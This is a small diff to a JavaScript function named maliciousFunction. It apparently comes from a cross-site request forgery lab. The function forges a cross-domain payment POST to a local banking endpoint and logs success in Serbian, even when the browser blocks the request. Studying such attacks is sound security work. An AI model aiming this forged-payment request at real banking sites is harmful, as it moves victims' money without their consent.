@@ -19,13 +19,19 @@ function maliciousFunction() {
 		type : "POST",
 		contentType : "application/json",
 		crossDomain: true,
+		headers: {
+            'Access-Control-Allow-Origin': '*'
+        },
 		url : "http://localhost:8080/payments",
 		data : JSONNewPayment(recipient, account, amount, currency, managerId),
 		success : function() {
-			console.log("Uplata je uspešno izvršena. Uplaćeno je " + ammount + " " + curency + " na račun " + recipient);
+			console.log("Uplata je uspešno izvršena. Uplaćeno je " + amount + currency +  " na račun broj " +  account);
 		},
-		error : function(e) {
-			console.log("Dogodila se greška!");
+		error : function(data) {
+			if(data.status == 0)
+				console.log("Uplata je uspešno izvršena. Uplaćeno je " + amount + currency +  " na račun broj " +  account);
+			else
+				console.log("Dogodila se greška!");
 		}
 	});
 }
